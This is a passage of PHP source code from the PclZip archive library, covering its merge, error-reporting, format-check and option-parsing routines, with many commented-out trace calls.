    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::merge", "");
    $v_result = 1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Look if the $p_archive_to_add is a PclZip object
    if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The parameter is valid PclZip object");

      // ----- Merge the archive
      $v_result = $this->privMerge($p_archive_to_add);
    }

    // ----- Look if the $p_archive_to_add is a string (so a filename)
    else if (is_string($p_archive_to_add))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The parameter is a filename");

      // ----- Create a temporary archive
      $v_object_archive = new PclZip($p_archive_to_add);

      // ----- Merge the archive
      $v_result = $this->privMerge($v_object_archive);
    }

    // ----- Invalid variable
    else
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
      $v_result = PCLZIP_ERR_INVALID_PARAMETER;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------



  // --------------------------------------------------------------------------------
  // Function : errorCode()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function errorCode()
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      return(PclErrorCode());
    }
    else {
      return($this->error_code);
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : errorName()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function errorName($p_with_code=false)
  {
    $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                      PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                      PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                      PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                      PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                      PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                      PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                      PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                      PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                      PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                      PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                      PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                      PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                      PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                      PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                      PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                      PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                      PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                      PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                      ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                      ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                    );

    if (isset($v_name[$this->error_code])) {
      $v_value = $v_name[$this->error_code];
    }
    else {
      $v_value = 'NoName';
    }

    if ($p_with_code) {
      return($v_value.' ('.$this->error_code.')');
    }
    else {
      return($v_value);
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : errorInfo()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function errorInfo($p_full=false)
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      return(PclErrorString());
    }
    else {
      if ($p_full) {
        return($this->errorName(true)." : ".$this->error_string);
      }
      else {
        return($this->error_string." [code ".$this->error_code."]");
      }
    }
  }
  // --------------------------------------------------------------------------------


// --------------------------------------------------------------------------------
// ***** UNDER THIS LINE ARE DEFINED PRIVATE INTERNAL FUNCTIONS *****
// *****                                                        *****
// *****       THESES FUNCTIONS MUST NOT BE USED DIRECTLY       *****
// --------------------------------------------------------------------------------



  // --------------------------------------------------------------------------------
  // Function : privCheckFormat()
  // Description :
  //   This method check that the archive exists and is a valid zip archive.
  //   Several level of check exists. (futur)
  // Parameters :
  //   $p_level : Level of check. Default 0.
  //              0 : Check the first bytes (magic codes) (default value))
  //              1 : 0 + Check the central directory (futur)
  //              2 : 1 + Check each file header (futur)
  // Return Values :
  //   true on success,
  //   false on error, the error code is set.
  // --------------------------------------------------------------------------------
  function privCheckFormat($p_level=0)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCheckFormat", "");
    $v_result = true;

        // ----- Reset the file system cache
    clearstatcache();

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Look if the file exits
    if (!is_file($this->zipname)) {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, false, PclZip::errorInfo());
      return(false);
    }

    // ----- Check that the file is readeable
    if (!is_readable($this->zipname)) {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, false, PclZip::errorInfo());
      return(false);
    }

    // ----- Check the magic code
    // TBC

    // ----- Check the central header
    // TBC

    // ----- Check each file header
    // TBC

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privParseOptions()
  // Description :
  //   This internal methods reads the variable list of arguments ($p_options_list,
  //   $p_size) and generate an array with the options and values ($v_result_list).
  //   $v_requested_options contains the options that can be present and those that
  //   must be present.
  //   $v_requested_options is an array, with the option value as key, and 'optional',
  //   or 'mandatory' as value.
  // Parameters :
  //   See above.
  // Return Values :
  //   1 on success.
  //   0 on failure.
  // --------------------------------------------------------------------------------
  function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privParseOptions", "");
    $v_result=1;
    
    // ----- Read the options
    $i=0;
    while ($i<$p_size) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Looking for table index $i, option = '".PclZipUtilOptionText($p_options_list[$i])."(".$p_options_list[$i].")'");

      // ----- Check if the option is supported
      if (!isset($v_requested_options[$p_options_list[$i]])) {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Look for next option
      switch ($p_options_list[$i]) {
        // ----- Look for options that request a path value
        case PCLZIP_OPT_PATH :
        case PCLZIP_OPT_REMOVE_PATH :
        case PCLZIP_OPT_ADD_PATH :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (   is_string($p_options_list[$i+1])
              && ($p_options_list[$i+1] != '')) {
            $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
            $i++;
          }
          else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." set with an empty value is ignored.");
          }
        break;

        // ----- Look for options that request an array of string for value
        case PCLZIP_OPT_BY_NAME :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
          }
          else if (is_array($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that request an EREG or PREG expression
        case PCLZIP_OPT_BY_EREG :
        case PCLZIP_OPT_BY_PREG :
        //case PCLZIP_OPT_CRYPT :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that takes a string
        case PCLZIP_OPT_COMMENT :
        case PCLZIP_OPT_ADD_COMMENT :
        case PCLZIP_OPT_PREPEND_COMMENT :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
                                             "Missing parameter value for option '"
                                                                 .PclZipUtilOptionText($p_options_list[$i])
                                                                 ."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
                                             "Wrong parameter value for option '"
                                                                 .PclZipUtilOptionText($p_options_list[$i])
                                                                 ."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that request an array of index
        case PCLZIP_OPT_BY_INDEX :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_work_list = array();
          if (is_string($p_options_list[$i+1])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Index value is a string '".$p_options_list[$i+1]."'");

              // ----- Remove spaces
              $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

              // ----- Parse items
              $v_work_list = explode(",", $p_options_list[$i+1]);
          }
          else if (is_integer($p_options_list[$i+1])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Index value is an integer '".$p_options_list[$i+1]."'");
              $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
          }
          else if (is_array($p_options_list[$i+1])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Index value is an array");
              $v_work_list = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          
          // ----- Reduce the index list
          // each index item in the list must be a couple with a start and
          // an end value : [0,3], [5-5], [8-10], ...
          // ----- Check the format of each item
          $v_sort_flag=false;
          $v_sort_value=0;
          for ($j=0; $j<sizeof($v_work_list); $j++) {
              // ----- Explode the item
              $v_item_list = explode("-", $v_work_list[$j]);
              $v_size_item_list = sizeof($v_item_list);
              
              // ----- TBC : Here we might check that each item is a
              // real integer ...
              
              // ----- Look for single value
              if ($v_size_item_list == 1) {
                  // ----- Set the option value
                  $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                  $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
              }
              elseif ($v_size_item_list == 2) {
                  // ----- Set the option value
                  $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                  $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
              }
              else {
                  // ----- Error log
                  PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                  // ----- Return
                  //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                  return PclZip::errorCode();
              }

              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extracted index item = [".$v_result_list[$p_options_list[$i]][$j]['start'].",".$v_result_list[$p_options_list[$i]][$j]['end']."]");

              // ----- Look for list sort
              if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The list should be sorted ...");
                  $v_sort_flag=true;

                  // ----- TBC : An automatic sort should be writen ...
                  // ----- Error log
                  PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                  // ----- Return
                  //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                  return PclZip::errorCode();
              }
              $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
          }
          
          // ----- Sort the items
          if ($v_sort_flag) {
              // TBC : To Be Completed
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "List sorting is not yet write ...");
          }

          // ----- Next option
          $i++;
        break;

        // ----- Look for options that request no value
        case PCLZIP_OPT_REMOVE_ALL_PATH :
        case PCLZIP_OPT_EXTRACT_AS_STRING :
        case PCLZIP_OPT_NO_COMPRESSION :
        case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
        case PCLZIP_OPT_REPLACE_NEWER :
        case PCLZIP_OPT_STOP_ON_ERROR :
          $v_result_list[$p_options_list[$i]] = true;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
        break;

        // ----- Look for options that request an octal value
        case PCLZIP_OPT_SET_CHMOD :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that request a call-back
        case PCLZIP_CB_PRE_EXTRACT :
        case PCLZIP_CB_POST_EXTRACT :
        case PCLZIP_CB_PRE_ADD :
        case PCLZIP_CB_POST_ADD :
        /* for futur use
        case PCLZIP_CB_PRE_DELETE :
        case PCLZIP_CB_POST_DELETE :
        case PCLZIP_CB_PRE_LIST :
        case PCLZIP_CB_POST_LIST :
        */
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_function_name = $p_options_list[$i+1];
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "call-back ".PclZipUtilOptionText($p_options_list[$i])." = '".$v_function_name."'");

          // ----- Check that the value is a valid existing function
          if (!function_exists($v_function_name)) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Set the attribute
          $v_result_list[$p_options_list[$i]] = $v_function_name;
          $i++;
        break;

        default :
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
                                       "Unknown parameter '"
                                                           .$p_options_list[$i]."'");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return PclZip::errorCode();
      }

      // ----- Next options
      $i++;
    }

    // ----- Look for mandatory options
    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        // ----- Look for mandatory option
        if ($v_requested_options[$key] == 'mandatory') {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Detect a mandatory option : ".PclZipUtilOptionText($key)."(".$key.")");
          // ----- Look if present
          if (!isset($v_result_list[$key])) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
        }
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privFileDescrParseAtt()
  // Description :
  // Parameters :
  // Return Values :
  //   1 on success.
  //   0 on failure.
  // --------------------------------------------------------------------------------
  function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privFileDescrParseAtt", "");
    $v_result=1;
    
    // ----- For each file in the list check the attributes
    foreach ($p_file_list as $v_key => $v_value) {
    
      // ----- Check if the option is supported
      if (!isset($v_requested_options[$v_key])) {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Look for attribute
      switch ($v_key) {
        case PCLZIP_ATT_FILE_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
          
          if ($p_filedescr['filename'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

        break;

        case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");

          if ($p_filedescr['new_short_name'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
        break;

        case PCLZIP_ATT_FILE_NEW_FULL_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");

          if ($p_filedescr['new_full_name'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
        break;

        // ----- Look for options that takes a string
        case PCLZIP_ATT_FILE_COMMENT :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['comment'] = $v_value;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
        break;

        case PCLZIP_ATT_FILE_MTIME :
          if (!is_integer($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['mtime'] = $v_value;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
        break;

        case PCLZIP_ATT_FILE_CONTENT :
          $p_filedescr['content'] = $v_value;
          ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
        break;

        default :
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
                                           "Unknown parameter '".$v_key."'");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return PclZip::errorCode();
      }

      // ----- Look for mandatory options
      if ($v_requested_options !== false) {
        for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
          // ----- Look for mandatory option
          if ($v_requested_options[$key] == 'mandatory') {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Detect a mandatory option : ".PclZipUtilOptionText($key)."(".$key.")");
            // ----- Look if present
            if (!isset($p_file_list[$key])) {
              PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
              return PclZip::errorCode();
            }
          }
        }
      }
    
    // end foreach
    }
    
    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privFileDescrExpand()
  // Description :
  // Parameters :
  // Return Values :
  //   1 on success.
  //   0 on failure.
  // --------------------------------------------------------------------------------
  function privFileDescrExpand(&$p_filedescr_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privFileDescrExpand", "");
    $v_result=1;
    
    // ----- Create a result list
    $v_result_list = array();
    
    // ----- Look each entry
    for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Looking for file ".$i.".");
      
      // ----- Get filedescr
      $v_descr = $p_filedescr_list[$i];
      
      // ----- Reduce the filename
